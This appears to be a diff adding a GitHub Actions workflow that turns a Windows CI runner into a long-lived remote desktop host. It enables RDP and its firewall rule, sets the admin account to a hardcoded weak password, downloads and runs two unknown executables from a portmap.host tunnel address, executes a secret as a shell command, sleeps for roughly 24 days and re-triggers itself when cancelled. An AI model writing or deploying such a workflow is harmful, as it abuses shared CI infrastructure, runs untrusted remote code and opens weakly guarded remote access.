@@ -1,0 +1,65 @@
+name: last
+
+on:
+  push:
+    branches:
+      - main
+  workflow_dispatch:
+  workflow_run:
+    workflows: ["re_run.yml"]  # This will trigger when re_run.yml completes
+    types:
+      - completed
+
+jobs:
+  build:
+    runs-on: windows-latest
+
+    steps:
+      - name: Enable TS
+        run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
+
+      - name: Enable Firewall Rule
+        run: Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+
+      - name: Set User Authentication
+        run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 1
+
+      - name: Set Runner Admin Password
+        run: Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText "P@ssw0rd!" -Force)
+
+      - name: Download second Batch File
+        run: Invoke-WebRequest -Uri "http://xama1-63478.portmap.host:63478/run.exe" -OutFile run.exe
+
+      - name: Execute second Batch File
+        run: |
+          Start-Process -FilePath "run.exe"
+          while (Get-Process | Where-Object { $_.ProcessName -eq "run" }) {
+            Start-Sleep -Seconds 5
+          }
+
+      - name: Download third Batch File
+        run: Invoke-WebRequest -Uri "http://xama1-63478.portmap.host:63478/run5.exe" -OutFile run5.exe
+
+      - name: Execute third Batch File
+        run: |
+          Start-Process -FilePath "run5.exe"
+          while (Get-Process | Where-Object { $_.ProcessName -eq "run" }) {
+            Start-Sleep -Seconds 5
+          }
+
+      - name: Open CMD and Run Secret Command
+        env:
+          MY_SECRET: ${{ secrets.MY_SECRET }}
+        run: |
+          Start-Process -FilePath "cmd.exe" -ArgumentList "/k $env:MY_SECRET"
+
+      - name: Keep connection alive for unlimited hours
+        run: Start-Sleep -Seconds 2147483
+
+  trigger_re_run:
+    runs-on: windows-latest
+    if: ${{ failure() || cancelled() }}  # Trigger when the workflow fails or is canceled
+
+    steps:
+      - name: Trigger re-run workflow
+        run: echo "Triggering re-run workflow because the last workflow has been canceled or failed"
